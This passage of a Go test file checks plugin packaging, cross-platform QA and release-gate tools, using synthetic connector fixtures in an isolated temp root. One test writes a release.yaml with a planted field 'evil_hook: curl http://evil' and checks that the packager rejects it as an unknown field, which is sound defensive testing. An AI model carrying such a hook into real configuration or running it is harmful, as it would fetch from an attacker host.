  "exports":[{"kind":"broken-kind","credential_mode":"none","access_scope":"any","process_sharing":"per_instance"}]
}`, runtime.GOOS, runtime.GOARCH)
	if err := os.WriteFile(filepath.Join(broken, "manifest", "template.backendplugin.json"), []byte(man), 0o644); err != nil {
		t.Fatal(err)
	}
	out := runToolExpectError(t, root, "./tools/backendplugin/package_plugins", "-root", root, "-profile", "full", "-dest", dest, "-select", "_broken_pkg_probe")
	if !strings.Contains(out, "build") && !strings.Contains(out, "exit status") && !strings.Contains(out, "failed") {
		t.Fatalf("expected failure, got output:\n%s", out)
	}
	if _, err := os.Stat(marker); err != nil {
		t.Fatal("failed package must leave prior staged files untouched")
	}
	after, err := os.ReadFile(filepath.Join(dest, "package-index.json"))
	if err != nil {
		t.Fatal(err)
	}
	if string(before) != string(after) {
		t.Fatal("failed package must not rewrite prior index")
	}
}

//nolint:paralleltest // writes synthetic fixtures under a private temp root
func TestPackage_RejectsUnknownReleaseFields(t *testing.T) {
	root := isolatedConnectorRoot(t)
	bad := filepath.Join(root, "connectors", "_bad_release_fields")
	t.Cleanup(func() { _ = os.RemoveAll(bad) })
	if err := os.MkdirAll(bad, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(bad, "go.mod"), []byte("module example.com/bad\n\ngo 1.26.5\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(bad, "release.yaml"), []byte(`schema: aip.connector.release/v1
plugin_id: com.aiproxer.backend.bad
factory_kind: bad
module: example.com/bad
command: ./cmd/x
manifest_template: manifest/t.json
version: 0.0.1
build_id: x
profiles: [full]
published_root_module: github.com/aiproxer/aiproxer
replace_policy: development-replace-to-monorepo-root
evil_hook: curl http://evil
`), 0o644); err != nil {
		t.Fatal(err)
	}
	out := runToolExpectError(t, root, "./tools/backendplugin/package_plugins", "-root", root, "-profile", "full", "-dest", t.TempDir(), "-select", "_bad_release_fields")
	if !strings.Contains(out, "unknown field") && !strings.Contains(out, "field evil_hook not found") {
		t.Fatalf("expected unknown field rejection, got:\n%s", out)
	}
}

func TestModuleChecksScripts_RequireRootGoTest(t *testing.T) {
	t.Parallel()
	root := repoRoot(t)
	for _, rel := range []string{
		"scripts/backend-plugin-module-checks.ps1",
		"scripts/backend-plugin-module-checks.sh",
	} {
		b, err := os.ReadFile(filepath.Join(root, rel))
		if err != nil {
			t.Fatal(err)
		}
		body := string(b)
		preDiscover := body
		if pre, _, ok := strings.Cut(body, "discover modules"); ok {
			preDiscover = pre
		}
		if !strings.Contains(preDiscover, "root go test") || !strings.Contains(preDiscover, "go test ./...") {
			t.Fatalf("%s must run root go test ./... before module discovery", rel)
		}
		if strings.Contains(body, "make backend-plugin-module-checks") {
			t.Fatalf("%s must not recursively invoke make backend-plugin-module-checks", rel)
		}
	}
}

//nolint:paralleltest // writes synthetic fixtures under a private temp root
func TestCrossPlatformQA_RejectsUnsupportedHostChannelClaim(t *testing.T) {
	root := isolatedConnectorRoot(t)
	synName := "_synthetic_xplat_darwin_claim"
	syn := filepath.Join(root, "connectors", synName)
	t.Cleanup(func() { _ = os.RemoveAll(syn) })
	writeSyntheticConnectorWithPlatforms(t, syn, synName, []string{"private/note.txt"}, defaultConnectorPlatforms(), func(connRoot string) {
		if err := os.WriteFile(filepath.Join(connRoot, "private", "note.txt"), []byte("private\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	})
	// Force a Darwin claim that the host secure channel cannot satisfy.
	manPath := filepath.Join(syn, "manifest", "template.backendplugin.json")
	manBody, err := os.ReadFile(manPath)
	if err != nil {
		t.Fatal(err)
	}
	forced := strings.Replace(string(manBody), `"platforms": [`, `"platforms": [
    {"os": "darwin", "arch": "arm64"},`, 1)
	if err := os.WriteFile(manPath, []byte(forced), 0o644); err != nil {
		t.Fatal(err)
	}
	outPath := filepath.Join(t.TempDir(), "matrix.json")
	for _, mode := range []string{"-compile-only", "-skip-compile"} {
		out := runToolExpectError(t, root, "./tools/backendplugin/crossplatform_qa",
			"-root", root, "-out", outPath, "-select", synName, "-skip-native", mode)
		if !strings.Contains(out, "darwin") || !strings.Contains(out, "unsupported") {
			t.Fatalf("mode %s must reject unsupported claim, got:\n%s", mode, out)
		}
	}
}

func TestCrossPlatformQA_MatrixAndPackageMatch(t *testing.T) {
	t.Parallel()
	root := repoRoot(t)
	outPath := filepath.Join(t.TempDir(), "matrix.json")
	runTool(t, root, "./tools/backendplugin/crossplatform_qa",
		"-root", root, "-out", outPath, "-select", "localstub", "-skip-native")
	raw, err := os.ReadFile(outPath)
	if err != nil {
		t.Fatal(err)
	}
	var report map[string]any
	if err := json.Unmarshal(raw, &report); err != nil {
		t.Fatal(err)
	}
	if report["schema"] != "aip.crossplatform.matrix/v1" {
		t.Fatalf("schema=%v", report["schema"])
	}
	mods, _ := report["modules"].([]any)
	if len(mods) < 2 {
		t.Fatalf("expected structural modules, got %v", mods)
	}
	var joined strings.Builder
	for _, m := range mods {
		s, ok := m.(string)
		if !ok {
			t.Fatalf("matrix entry type %T", m)
		}
		joined.WriteString(s)
		joined.WriteByte('\n')
	}
	if !strings.Contains(joined.String(), "connectors/") || !strings.Contains(joined.String(), "connector-support/") {
		t.Fatalf("modules must discover connectors and connector-support: %v", mods)
	}
	unsup, _ := report["unsupported"].([]any)
	if len(unsup) == 0 {
		t.Fatal("unsupported connector-platform pairs must be recorded")
	}
	foundDarwin := false
	for _, u := range unsup {
		m, ok := u.(map[string]any)
		if !ok {
			t.Fatalf("unsupported entry type %T", u)
		}
		if m["os"] == "darwin" {
			foundDarwin = true
			if reason, _ := m["reason"].(string); !strings.Contains(reason, "host_channel") {
				t.Fatalf("darwin unsupported reason=%v", m["reason"])
			}
		}
	}
	if !foundDarwin {
		t.Fatal("expected darwin unsupported pairs in matrix metadata")
	}
	rootOK, _ := report["root_independent"].(bool)
	if !rootOK {
		t.Fatal("root must not depend on connector modules")
	}
	pkgMatch, _ := report["package_matrix_match"].(bool)
	if !pkgMatch {
		t.Fatal("package matrix must match discovered release set")
	}
	claims, _ := report["claimed_compile"].([]any)
	if len(claims) == 0 {
		t.Fatal("expected claimed compile results")
	}
	for _, c := range claims {
		m, ok := c.(map[string]any)
		if !ok {
			t.Fatalf("claimed compile entry type %T", c)
		}
		if m["os"] == "darwin" {
			t.Fatalf("darwin must not remain a claimed compile platform: %#v", m)
		}
		if ok, _ := m["ok"].(bool); !ok {
			t.Fatalf("claimed compile failed: %#v", m)
		}
	}
}

func TestCrossPlatformQA_MakefileTargetExactCommand(t *testing.T) {
	t.Parallel()
	root := repoRoot(t)
	mk, err := os.ReadFile(filepath.Join(root, "Makefile"))
	if err != nil {
		t.Fatal(err)
	}
	body := string(mk)
	if !strings.Contains(body, "backend-plugin-cross-platform-qa:") {
		t.Fatal("Makefile missing backend-plugin-cross-platform-qa target")
	}
	if !strings.Contains(body, "./tools/backendplugin/crossplatform_qa") {
		t.Fatal("Makefile must invoke crossplatform_qa tool")
	}
	if !strings.Contains(body, "aip.crossplatform.matrix") && !strings.Contains(body, ".aip-crossplatform-matrix.json") {
		t.Fatal("Makefile must write machine-readable matrix metadata")
	}
}

func TestReleaseGates_StaticReportAndTraceability(t *testing.T) {
	t.Parallel()
	root := repoRoot(t)
	outPath := filepath.Join(t.TempDir(), "report.json")
	runTool(t, root, "./tools/backendplugin/release_gates",
		"-root", root, "-out", outPath, "-mode", "static")
	raw, err := os.ReadFile(outPath)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(raw), `"timestamp"`) || strings.Contains(string(raw), "T15:") || strings.Contains(string(raw), `"native_host"`) {
		t.Fatal("release report must be deterministic (no timestamps/native_host)")
	}
	if abs, err := filepath.Abs(root); err == nil && abs != "" && strings.Contains(string(raw), abs) {
		t.Fatal("release report must not embed absolute paths")
	}
	var report map[string]any
	if err := json.Unmarshal(raw, &report); err != nil {
		t.Fatal(err)
	}
	if report["schema"] != "aip.release.gates/v1" {
		t.Fatalf("schema=%v", report["schema"])
	}
	if _, ok := report["native_host"]; ok {
		t.Fatal("native_host must be omitted from deterministic report")
	}
	if report["mode"] != "static" {
		t.Fatalf("mode=%v", report["mode"])
	}
	mods, _ := report["modules"].([]any)
	if len(mods) < 2 {
		t.Fatalf("expected structural modules, got %v", mods)
	}
	var joined strings.Builder
	for _, m := range mods {
		s, ok := m.(string)
		if !ok {
			t.Fatalf("matrix entry type %T", m)
		}
		joined.WriteString(s)
		joined.WriteByte('\n')
	}
	if !strings.Contains(joined.String(), "connectors/") || !strings.Contains(joined.String(), "connector-support/") {
		t.Fatalf("modules must discover connectors and connector-support: %v", mods)
	}
	rootOK, _ := report["root_independent"].(bool)
	if !rootOK {
		t.Fatal("root must not depend on connector modules")
	}
	rc, _ := report["requirement_count"].(float64)
	if int(rc) != 116 {
		t.Fatalf("requirement_count=%v want 116 (parsed from requirements.md)", rc)
	}
	trace, _ := report["traceability"].([]any)
	if len(trace) != 116 {
		t.Fatalf("traceability must cover all 116 requirements 1.1-12.11, got %d entries", len(trace))
	}
	seen := map[string]bool{}
	pending := 0
	for _, row := range trace {
		m, ok := row.(map[string]any)
		if !ok {
			t.Fatalf("trace row type %T", row)
		}
		id, _ := m["id"].(string)
		gate, _ := m["gate"].(string)
		status, _ := m["status"].(string)
		if id == "" || gate == "" {
			t.Fatalf("trace row missing id/gate: %#v", m)
		}
		switch status {
		case "local_executable", "external_blocker", "unsupported", "pending":
		default:
			t.Fatalf("trace %s status=%q", id, status)
		}
		if status == "pending" {
			pending++
		}
		if status == "local_executable" && gate == "adapter_stream_session" {
			t.Fatal("static mode must not claim local_executable for unobserved adapter_stream_session")
		}
		seen[id] = true
	}
	if pending == 0 {
		t.Fatal("static mode should leave unobserved gates as pending")
	}
	for _, id := range []string{"1.1", "1.7", "12.7", "12.11", "11.12", "7.13"} {
		if !seen[id] {
			t.Fatalf("missing traceability for %s", id)
		}
	}
}

func TestReleaseGates_StaticReportByteIdenticalTwice(t *testing.T) {
	t.Parallel()
	root := repoRoot(t)
	dir := t.TempDir()
	a := filepath.Join(dir, "a.json")
	b := filepath.Join(dir, "b.json")
	runTool(t, root, "./tools/backendplugin/release_gates", "-root", root, "-out", a, "-mode", "static")
	runTool(t, root, "./tools/backendplugin/release_gates", "-root", root, "-out", b, "-mode", "static")
	ba, err := os.ReadFile(a)
	if err != nil {
		t.Fatal(err)
	}
	bb, err := os.ReadFile(b)
	if err != nil {
		t.Fatal(err)
	}
	if string(ba) != string(bb) {
		t.Fatalf("static reports not byte-identical\n---a---\n%s\n---b---\n%s", ba, bb)
	}
	if strings.Contains(string(ba), `"native_host"`) || strings.Contains(string(ba), "1.019s") {
		t.Fatal("static report leaked host/timing fields")
	}
}

func TestReleaseGates_MakefileTargetExactCommand(t *testing.T) {
	t.Parallel()
	root := repoRoot(t)
	mk, err := os.ReadFile(filepath.Join(root, "Makefile"))
	if err != nil {
		t.Fatal(err)
	}
	body := string(mk)
	if !strings.Contains(body, "backend-plugin-release-gates:") {
		t.Fatal("Makefile missing backend-plugin-release-gates target")
	}
	if !strings.Contains(body, "./tools/backendplugin/release_gates") {
		t.Fatal("Makefile must invoke release_gates tool")
	}
	if !strings.Contains(body, ".aip-release-gates-report.json") {
		t.Fatal("Makefile must write machine-readable release report")
	}
	if !strings.Contains(body, "TestReleaseGates_") {
		t.Fatal("Makefile must execute TestReleaseGates_ tool tests")
	}
	if !strings.Contains(body, "-mode=full") {
		t.Fatal("full release gates must use release_gates -mode=full")
	}
	if strings.Contains(body, "TestDuplicate|TestUnknown|TestStrict") {
		t.Fatal("Makefile must not keep dead discovery filter fragments")
	}
}

func writeSyntheticConnector(t *testing.T, syn, name string) {
	t.Helper()
	writeSyntheticConnectorWithCompanions(t, syn, name, []string{"private/note.txt"}, func(connRoot string) {
		if err := os.WriteFile(filepath.Join(connRoot, "private", "note.txt"), []byte("private\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	})
}

type platformSpec struct {
	OS   string
	Arch string
}

func defaultConnectorPlatforms() []platformSpec {
	return []platformSpec{
		{OS: "windows", Arch: "amd64"},
		{OS: "windows", Arch: "arm64"},
		{OS: "linux", Arch: "amd64"},
		{OS: "linux", Arch: "arm64"},
	}
}

func nativePackagingPlatforms() []platformSpec {
	plats := defaultConnectorPlatforms()
	plats = append(plats, platformSpec{OS: runtime.GOOS, Arch: runtime.GOARCH})
	return plats
}

func writeSyntheticConnectorWithCompanions(t *testing.T, syn, name string, companions []string, setup func(connRoot string)) {
	t.Helper()
	// Packaging-oriented synthetics claim the native host so Darwin (fail-closed,
	// no production darwin claims) can still exercise package layout paths.
	writeSyntheticConnectorWithPlatforms(t, syn, name, companions, nativePackagingPlatforms(), setup)
}

func writeSyntheticConnectorWithPlatforms(t *testing.T, syn, name string, companions []string, platforms []platformSpec, setup func(connRoot string)) {
	t.Helper()
	for _, d := range []string{
		filepath.Join(syn, "cmd", "aip-backend-synthetic"),
		filepath.Join(syn, "manifest"),
		filepath.Join(syn, "private"),
	} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(syn, "go.mod"), []byte("module github.com/aiproxer/aiproxer/connectors/"+name+"\n\ngo 1.26.5\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var companionYAML strings.Builder
	if len(companions) == 0 {
		companionYAML.WriteString("private_companions: []\n")
	} else {
		companionYAML.WriteString("private_companions:\n")
		for _, c := range companions {
			companionYAML.WriteString("  - ")
			companionYAML.WriteString(c)
			companionYAML.WriteByte('\n')
		}
	}
	rel := `schema: aip.connector.release/v1
plugin_id: com.aiproxer.backend.` + name + `
factory_kind: ` + name + `
module: github.com/aiproxer/aiproxer/connectors/` + name + `
command: ./cmd/aip-backend-synthetic
manifest_template: manifest/template.backendplugin.json
version: 0.0.1
build_id: synthetic
tag: synthetic-v0.0.1
profiles:
  - full
published_root_module: github.com/aiproxer/aiproxer
replace_policy: development-replace-to-monorepo-root
` + companionYAML.String()
	if err := os.WriteFile(filepath.Join(syn, "release.yaml"), []byte(rel), 0o644); err != nil {
		t.Fatal(err)
	}
	seen := map[string]struct{}{}
	var platJSON strings.Builder
	platJSON.WriteString("[\n")
	first := true
	for _, p := range platforms {
		key := p.OS + "/" + p.Arch
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}
		if !first {
			platJSON.WriteString(",\n")
		}
		first = false
		fmt.Fprintf(&platJSON, `    {"os": %q, "arch": %q}`, p.OS, p.Arch)
	}
	platJSON.WriteString("\n  ]")
	man := `{
  "schema": "aiproxer.backendplugin.manifest/v1",
  "plugin_id": "com.aiproxer.backend.` + name + `",
  "version": "0.0.1",
  "build_id": "REPLACE_BUILD_ID",
  "executable": "bin/aip-backend-synthetic",
  "sha256": "REPLACE_SHA256",
  "protocol_major": 1,
  "protocol_min_minor": 0,
  "protocol_max_minor": 0,
  "platforms": ` + platJSON.String() + `,
  "exports": [{
    "kind": "` + name + `",
    "credential_mode": "none",
    "access_scope": "any",
    "process_sharing": "per_instance"
  }]
}`
	if err := os.WriteFile(filepath.Join(syn, "manifest", "template.backendplugin.json"), []byte(man), 0o644); err != nil {
		t.Fatal(err)
	}
	main := "package main\nfunc main() {}\n"
	if err := os.WriteFile(filepath.Join(syn, "cmd", "aip-backend-synthetic", "main.go"), []byte(main), 0o644); err != nil {
		t.Fatal(err)
	}
	if setup != nil {
		setup(syn)
	}
}

func requireNativeClaimedConnector(t *testing.T, root, dirName string) {
	t.Helper()
	if !connectorClaimsNative(t, root, dirName) {
		t.Skipf("%s does not claim native %s/%s; packaging omits unsupported connectors", dirName, runtime.GOOS, runtime.GOARCH)
	}
}

func connectorClaimsNative(t *testing.T, root, dirName string) bool {
	t.Helper()
	manPath := filepath.Join(root, "connectors", dirName, "manifest", "template.backendplugin.json")
	b, err := os.ReadFile(manPath)
	if err != nil {
		t.Fatalf("read %s: %v", manPath, err)
	}
	var man struct {
		Platforms []struct {
			OS   string `json:"os"`
			Arch string `json:"arch"`
		} `json:"platforms"`
	}
	if err := json.Unmarshal(b, &man); err != nil {
		t.Fatalf("parse %s: %v", manPath, err)
	}
	for _, p := range man.Platforms {
		if p.OS == runtime.GOOS && p.Arch == runtime.GOARCH {
			return true
		}
	}
	return false
}

var (
	toolsOnce sync.Once
	toolsDir  string
	toolsErr  error
)

func getToolExe(t *testing.T, toolRelPath string) string {
	t.Helper()
	toolsOnce.Do(func() {
		root := toolsCacheRoot
		if root == "" {
			r, err := os.MkdirTemp("", "aip-tools-bin-root-")
			if err != nil {
				toolsErr = err
				return
			}
			toolsCacheRoot = r
			root = r
		}
		dir, err := os.MkdirTemp(root, "aip-tools-bin-*")
		if err != nil {
			toolsErr = err
			return
		}
		toolsDir = dir
		tools := []string{
			"discover_modules",
			"package_plugins",
			"crossplatform_qa",
			"release_gates",
		}
		root = repoRoot(t)
		for _, name := range tools {
			binPath := filepath.Join(dir, name)
			if runtime.GOOS == "windows" {
				binPath += ".exe"
			}
			cmd := exec.Command("go", "build", "-o", binPath, "./tools/backendplugin/"+name)
			cmd.Dir = root
			cmd.Env = append(os.Environ(), "GOWORK=off")
			if out, err := cmd.CombinedOutput(); err != nil {
				toolsErr = fmt.Errorf("go build %s: %v\n%s", name, err, out)
				return
			}
		}
	})
	if toolsErr != nil {
		t.Fatalf("setup tool binaries: %v", toolsErr)
	}
	base := filepath.Base(toolRelPath)
	bin := filepath.Join(toolsDir, base)
	if runtime.GOOS == "windows" {
		bin += ".exe"
	}
	return bin
}

func runTool(t *testing.T, root string, args ...string) string {
	t.Helper()
	if len(args) > 0 && strings.HasPrefix(args[0], "./tools/backendplugin/") {
		exe := getToolExe(t, args[0])
		cmd := exec.Command(exe, args[1:]...)
		cmd.Dir = root
		cmd.Env = append(os.Environ(), "GOWORK=off", "AIP_PACKAGE_PLUGINS_BIN="+getToolExe(t, "package_plugins"))
		b, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("tool %s %v: %v\n%s", args[0], args[1:], err, b)
		}
		return string(b)
	}
	cmd := exec.Command("go", append([]string{"run"}, args...)...)
	cmd.Dir = root
	cmd.Env = append(os.Environ(), "GOWORK=off")
	b, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("go run %v: %v\n%s", args, err, b)
	}
	return string(b)
}

func runToolExpectError(t *testing.T, root string, args ...string) string {
	t.Helper()
	if len(args) > 0 && strings.HasPrefix(args[0], "./tools/backendplugin/") {
		exe := getToolExe(t, args[0])
		cmd := exec.Command(exe, args[1:]...)
		cmd.Dir = root
		cmd.Env = append(os.Environ(), "GOWORK=off", "AIP_PACKAGE_PLUGINS_BIN="+getToolExe(t, "package_plugins"))
		b, err := cmd.CombinedOutput()
		if err == nil {
			t.Fatalf("tool %s %v: expected error, got success\n%s", args[0], args[1:], b)
		}
		return string(b)
	}
	cmd := exec.Command("go", append([]string{"run"}, args...)...)
	cmd.Dir = root
	cmd.Env = append(os.Environ(), "GOWORK=off")
	b, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatalf("go run %v: expected error, got success\n%s", args, b)
	}
	return string(b)
}

func readIndex(t *testing.T, dest string) map[string]any {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(dest, "package-index.json"))
	if err != nil {
		t.Fatal(err)
	}
	var idx map[string]any
	if err := json.Unmarshal(b, &idx); err != nil {
		t.Fatal(err)
	}
	return idx
}

func fileDigest(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}

func repoRoot(t *testing.T) string {
	t.Helper()
	wd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	dir := wd
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			if _, err := os.Stat(filepath.Join(dir, "cmd", "aipstd")); err == nil {
				return dir
			}
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			t.Fatal("repo root not found")
		}
		dir = parent
	}
}

// isolatedConnectorRoot returns a private temporary repository root that the
// backendplugin tools scan instead of the shared checkout. Synthetic connector
// fixtures are written only under this root, so concurrent whole-repository
// architecture scans (internal/archtest shrinkage walks) never observe
// transient test paths appearing or disappearing under the real connectors/.
func isolatedConnectorRoot(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	real := repoRoot(t)
	if isWithinDir(real, root) {
		t.Fatalf("isolated connector root %q must not live inside real repo %q", root, real)
	}
	if err := os.MkdirAll(filepath.Join(root, "connectors"), 0o755); err != nil {
		t.Fatal(err)
	}
	return root
}

// seedRealConnector copies a real connector module (for example localstub) into
// the isolated root and repoints its development go.mod replace at the real
// checkout, so GOWORK=off builds still resolve the monorepo without copying it.
// Real connector coverage is preserved while the module itself lives outside the
// architecture-scanned tree.
func seedRealConnector(t *testing.T, root, name string) {
	t.Helper()
	real := repoRoot(t)
	src := filepath.Join(real, "connectors", name)
	dst := filepath.Join(root, "connectors", name)
	if err := seedConnectorModule(src, dst, real); err != nil {
		t.Fatalf("seed connector %s: %v", name, err)
	}
}

// seedConnectorModule copies connector source into dst and rewrites the
// development replace in its go.mod to point at replaceRoot instead of the
// relative ../.. form.
func seedConnectorModule(src, dst, replaceRoot string) error {
	if err := copyTreeFiles(src, dst); err != nil {
		return err
	}
	goMod := filepath.Join(dst, "go.mod")
	raw, err := os.ReadFile(goMod)
	if err != nil {
		return err
	}
	body := strings.ReplaceAll(string(raw), "=> ../..", "=> "+goModPathLiteral(replaceRoot))
	if body == string(raw) {
		return fmt.Errorf("connector go.mod at %s is missing the development replace to the monorepo root", src)
	}
	return os.WriteFile(goMod, []byte(body), 0o644)
}

// goModPathLiteral renders a filesystem path as a go.mod replacement literal.
// go.mod lexes an unquoted replacement as a bare token, so a checkout rooted at
// a path containing spaces (or other go.mod metacharacters) would produce an
// unparseable directive; Go string quoting after ToSlash keeps it valid while
// remaining byte-identical to the previous bare form for ordinary paths.
func goModPathLiteral(path string) string {
	return strconv.Quote(filepath.ToSlash(path))
}

func copyTreeFiles(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		rel, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}
		target := filepath.Join(dst, rel)
		if info.IsDir() {
			return os.MkdirAll(target, info.Mode().Perm())
		}
		return copyOneFile(path, target, info.Mode().Perm())
	})
}

func copyOneFile(src, dst string, perm os.FileMode) error {
	if err := os.MkdirAll(filepath.Dir(dst), 0o755); err != nil {
		return err
	}
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer func() { _ = in.Close() }()
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, perm)
	if err != nil {
		return err
	}
	if _, err := io.Copy(out, in); err != nil {
		_ = out.Close()
		return err
	}
	return out.Close()
}

func isWithinDir(parent, child string) bool {
	rel, err := filepath.Rel(parent, child)
	if err != nil {
		return false
	}
	if rel == "." {
		return true
	}
	return !filepath.IsAbs(rel) && rel != ".." && !strings.HasPrefix(rel, ".."+string(filepath.Separator))
}

func dirEntries(t *testing.T, dir string) []string {
	t.Helper()
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	names := make([]string, 0, len(entries))
	for _, e := range entries {
		names = append(names, e.Name())
	}
	sort.Strings(names)
	return names
}

// TestSyntheticFixtures_NeverWrittenUnderRealRepoConnectors pins the fix for the
// Windows qa-tagged-hotspots cross-package race: synthetic connector fixtures
// must be created under a private temporary root so internal/archtest's
// whole-repository walks cannot observe them appear or disappear. The RED
// evidence is the retained test-cost ratchet log; this test guards the invariant
// deterministically because the underlying OS-level race is timing dependent.
//
//nolint:paralleltest // asserts real-repo immutability, must not interleave
func TestSyntheticFixtures_NeverWrittenUnderRealRepoConnectors(t *testing.T) {
	real := repoRoot(t)
	realConnectors := filepath.Join(real, "connectors")
	before := dirEntries(t, realConnectors)

	root := isolatedConnectorRoot(t)
	synName := "_synthetic_isolation_regression"
	syn := filepath.Join(root, "connectors", synName)
	writeSyntheticConnectorWithCompanions(t, syn, synName, []string{"private/note.txt"}, func(connRoot string) {
		if err := os.WriteFile(filepath.Join(connRoot, "private", "note.txt"), []byte("private\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	})

	if !isWithinDir(root, syn) {
		t.Fatalf("synthetic fixture %q must live under isolated root %q", syn, root)
	}
	if _, err := os.Stat(filepath.Join(realConnectors, synName)); !os.IsNotExist(err) {
		t.Fatalf("synthetic fixture leaked into real repo connectors: err=%v", err)
	}
	after := dirEntries(t, realConnectors)
	if strings.Join(before, "\n") != strings.Join(after, "\n") {
		t.Fatalf("real repo connectors mutated by fixture setup:\nbefore=%v\nafter=%v", before, after)
	}
}

// TestSeedConnectorModule_QuotesReplacePathWithSpaces pins the portability fix
// for seeding a real connector from a checkout whose absolute path contains
// spaces: go.mod replacement paths are bare tokens unless quoted, so an
// unquoted spaced path makes go.mod unparseable and breaks localstub packaging.
// The seeded module must stay parseable and resolve the replacement to the exact
// spaced path.
//
//nolint:paralleltest // copies a fixture and shells out to go mod edit
func TestSeedConnectorModule_QuotesReplacePathWithSpaces(t *testing.T) {
	real := repoRoot(t)
	src := filepath.Join(real, "connectors", "localstub")

	base := t.TempDir()
	spacedRoot := filepath.Join(base, "checkout with spaces")
	if err := os.MkdirAll(spacedRoot, 0o755); err != nil {
		t.Fatal(err)
	}
	dst := filepath.Join(base, "connectors", "localstub")
	if err := seedConnectorModule(src, dst, spacedRoot); err != nil {
		t.Fatal(err)
	}

	out := goModEditJSON(t, dst)
	var parsed struct {
		Replace []struct {
			New struct {
				Path string `json:"Path"`
			} `json:"New"`
		} `json:"Replace"`
	}
	if err := json.Unmarshal(out, &parsed); err != nil {
		t.Fatalf("parse go mod edit -json: %v\n%s", err, out)
	}
	want := filepath.ToSlash(spacedRoot)
	for _, r := range parsed.Replace {
		if r.New.Path == want {
			return
		}
	}
	t.Fatalf("replacement path %q not found in %s", want, out)
}

func goModEditJSON(t *testing.T, dir string) []byte {
	t.Helper()
	cmd := exec.Command("go", "mod", "edit", "-json")
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "GOWORK=off")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("go mod edit -json in %s: %v\n%s", dir, err, out)
	}
	return out
}
